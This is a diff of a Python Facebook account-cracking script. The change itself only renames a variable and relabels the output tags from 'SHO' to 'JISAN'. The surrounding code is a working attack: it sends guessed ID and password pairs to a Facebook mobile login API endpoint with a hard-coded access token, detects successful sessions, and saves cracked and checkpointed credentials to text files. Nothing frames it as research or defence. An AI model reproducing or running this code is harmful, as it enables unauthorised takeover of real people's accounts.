@@ -62,10 +62,10 @@ class Main:
 		print("")
 		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s[Just-Now-Open]"%(P,G,R,Y,B))
 		print(" \033[1;96m[2] EXIT")
-		__SHO = input("\n\033[0;91m>>> \033[0;92m CHOOSE \033[0m: ")
-		if __SHO in ["", " "]:
+		__JISAN = input("\n\033[0;91m>>> \033[0;92m CHOOSE \033[0m: ")
+		if __JISAN in ["", " "]:
 			Main()
-		elif __SHO in ["1", "01"]:
+		elif __JISAN in ["1", "01"]:
 			self.fbtua()
 		else:
 			exit()
@@ -121,12 +121,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m   [SHO-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [JISAN-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [SHO-CP] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m   [JISAN-CP] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
